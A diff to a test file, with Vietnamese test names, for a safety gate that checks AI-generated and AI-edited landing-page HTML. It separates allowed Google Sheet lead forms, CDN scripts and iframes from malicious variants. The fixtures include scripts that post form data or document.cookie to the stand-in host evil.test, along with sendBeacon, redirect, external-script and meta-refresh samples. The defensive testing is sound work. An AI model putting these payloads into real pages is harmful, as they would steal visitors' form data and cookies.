@@ -187,6 +187,19 @@ describe('B-1 (2) — generate: chốt an toàn đầu ra (chặn lấy trộm d
     'onclick app.openQuickQRModal': '<button onclick="app.openQuickQRModal()">QR</button>',
     'onerror ảnh dự phòng placehold.co': '<img src="/lp-assets/uploads/1/landing/a.png" alt="" onerror="this.src=\'https://placehold.co/600x400?text=Anh\'">',
     'onsubmit chuyển zalo.me sau 1 giây': '<div onsubmit="setTimeout(function(){ window.location.href = \'https://zalo.me/g/abc123\'; }, 1000);"></div>',
+    // Vòng 3 (đo production 04/10): lead về Google Sheet (3 tên biến, có/không no-cors), popup localStorage, iframe, script src CDN.
+    'Google Sheet GOOGLE_SCRIPT_URL + no-cors':
+      "<script>const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxAbC123/exec'; document.getElementById('f').addEventListener('submit', function(e){ e.preventDefault(); fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new FormData(this) }).then(() => { window.location.href = 'https://zalo.me/g/abc123'; }); });</script>",
+    'Google Sheet scriptURL':
+      "<script>const scriptURL = 'https://script.google.com/macros/s/AKfycbxAbC123/exec'; const form = document.forms['lead']; form.addEventListener('submit', e => { e.preventDefault(); fetch(scriptURL, { method: 'POST', body: new FormData(form) }).catch(error => console.error('Error!', error.message)); });</script>",
+    'Google Sheet GOOGLE_SHEET_WEB_APP_URL':
+      "<script>const GOOGLE_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxAbC123/exec'; fetch(GOOGLE_SHEET_WEB_APP_URL, { method: 'POST', mode: 'no-cors', body: formData });</script>",
+    'popup localStorage.getItem(popupShown)': "<script>if (!localStorage.getItem('popupShown')) { setTimeout(function(){ document.getElementById('popup').classList.remove('hidden'); localStorage.setItem('popupShown', '1'); }, 3000); }</script>",
+    'iframe youtube-nocookie': '<iframe src="https://www.youtube-nocookie.com/embed/abc"></iframe>',
+    'iframe drive.google.com': '<iframe src="https://drive.google.com/file/d/1AbC/preview"></iframe>',
+    'iframe zingmp3.vn': '<iframe src="https://zingmp3.vn/embed/song/ZW123"></iframe>',
+    'script src unpkg.com': '<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>',
+    'script src cdnjs.cloudflare.com': '<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>',
   };
 
   it('trang sạch → 1 lần gọi, không thêm gì vào log', async () => {
@@ -208,13 +221,16 @@ describe('B-1 (2) — generate: chốt an toàn đầu ra (chặn lấy trộm d
 
   it.each([
     ['fetch gửi form ra ngoài', '<script>document.querySelector("form").addEventListener("submit", function(e){ fetch("https://evil.test/c", { method: "POST", body: new FormData(e.target) }); });</script>', 'net'],
-    ['sendBeacon', '<script>navigator.sendBeacon("https://evil.test/b", document.body.innerText)</script>', 'net'],
+    ['sendBeacon host lạ', '<script>navigator.sendBeacon("https://evil.test/b", document.body.innerText)</script>', 'net'],
+    ['fetch tới host lạ gán qua biến', '<script>const scriptURL = "https://evil.test/exec"; fetch(scriptURL, { method: "POST", body: new FormData(document.forms[0]) })</script>', 'net'],
+    ['fetch đích động không có URL chữ', '<script>fetch(window.TARGET_URL, { method: "POST", body: new FormData(document.forms[0]) })</script>', 'net'],
+    ['Google Sheet hợp lệ nhưng khối còn URL lạ', '<script>const backup = "https://evil.test/b"; const scriptURL = "https://script.google.com/macros/s/AKfy/exec"; fetch(scriptURL, { method: "POST", body: d })</script>', 'net'],
     ['document.cookie', '<script>var c = document.cookie;</script>', 'secret'],
     ['onerror gọi fetch', '<img src="x" onerror="fetch(\'https://evil.test/?c=\' + document.cookie)">', 'net,secret'],
     ['location.href sang domain lạ', '<button onclick="location.href=\'https://evil.test/login\'">bấm</button>', 'redirect'],
     ['script src ngoài lạ', '<script src="https://evil.test/x.js"></script>', 'script'],
     ['liên kết javascript:', '<a href="javascript:alert(1)">bấm</a>', 'jsurl'],
-    ['iframe ngoài danh sách', '<iframe src="https://evil.test/phish"></iframe>', 'iframe'],
+    ['iframe không phải https', '<iframe src="http://evil.test/phish"></iframe>', 'iframe'],
     ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">', 'meta'],
   ])('biến thể độc %s → lượt 1 trượt chốt, SINH LẠI đúng 1 lần kèm câu dặn; lượt 2 sạch → thành công, log unsafeRetry=1', async (_name, bad, kinds) => {
     generateWithBudget
@@ -259,12 +275,12 @@ describe('B-1 (2) — generate: chốt an toàn đầu ra (chặn lấy trộm d
     await expect(run()).rejects.toMatchObject({
       status: 422,
       code: 'LANDING_UNSAFE_OUTPUT',
-      message: expect.stringMatching(/AI vừa thêm mã gọi mạng ra ngoài.*trình soạn HTML/),
+      message: expect.stringMatching(/AI vừa thêm.*mã gọi mạng tới địa chỉ lạ.*trình soạn HTML/),
     });
     expect(generateWithBudget).toHaveBeenCalledTimes(2);
     const done = doneLogOf(logSpy);
     expect(done).toContain('outcome=error');
-    expect(done).toMatch(/unsafeKinds=net,secret/);
+    expect((done.match(/unsafeKinds=(\S+)/) || [])[1].split(",").sort().join(",")).toBe("net,secret");
   });
 
   it('lượt 1 trượt chốt an toàn, lượt 2 sạch script nhưng bịa ảnh → vẫn gỡ ảnh bịa như cũ', async () => {
@@ -327,7 +343,7 @@ describe('B-1 (2) — editHtml: chốt an toàn so với bản hiện tại', ()
     expect(promptOf(1)).toContain('ĐÃ CÓ SẴN');
     const done = doneLogOf(logSpy);
     expect(done).toContain('unsafeRetry=1');
-    expect(done).toMatch(/unsafeKinds=net,secret/);
+    expect((done.match(/unsafeKinds=(\S+)/) || [])[1].split(",").sort().join(",")).toBe("net,secret");
   });
 
   it('cả hai lượt trượt → 422 LANDING_UNSAFE_OUTPUT, không trả HTML nào', async () => {
@@ -352,6 +368,22 @@ describe('B-1 (2) — editHtml: chốt an toàn so với bản hiện tại', ()
     const res = await edit();
     expect(generateWithBudget).toHaveBeenCalledTimes(1);
     expect(res.html).toContain('closeZaloPopup()');
+  });
+
+  it('yêu cầu "gửi lead về Google Sheet": AI thêm khối fetch tới script.google.com → qua, 1 lần gọi; đổi sang host lạ → chặn', async () => {
+    const sheet = (url) =>
+      `<script>const scriptURL = '${url}'; document.getElementById('f').addEventListener('submit', function(e){ e.preventDefault(); fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: new FormData(this) }); });</script>`;
+    generateWithBudget.mockResolvedValue(
+      patchResponse([{ find: TITLE_EDIT.find, replace: `${TITLE_EDIT.replace}${sheet('https://script.google.com/macros/s/AKfy/exec')}` }])
+    );
+    const res = await edit(GOOD_PAGE, { instruction: 'gửi dữ liệu form về Google Sheet' });
+    expect(generateWithBudget).toHaveBeenCalledTimes(1);
+    expect(res.html).toContain('script.google.com/macros');
+    generateWithBudget.mockReset();
+    generateWithBudget.mockResolvedValue(
+      patchResponse([{ find: TITLE_EDIT.find, replace: `${TITLE_EDIT.replace}${sheet('https://evil.test/exec')}` }])
+    );
+    await expect(edit(GOOD_PAGE, { instruction: 'gửi dữ liệu form về Google Sheet' })).rejects.toMatchObject({ code: 'LANDING_UNSAFE_OUTPUT' });
   });
 
   it('trang khách đã có script/localStorage/onclick/form action ngoài: sửa chữ KHÔNG đụng chúng → không bị chặn, 1 lần gọi', async () => {
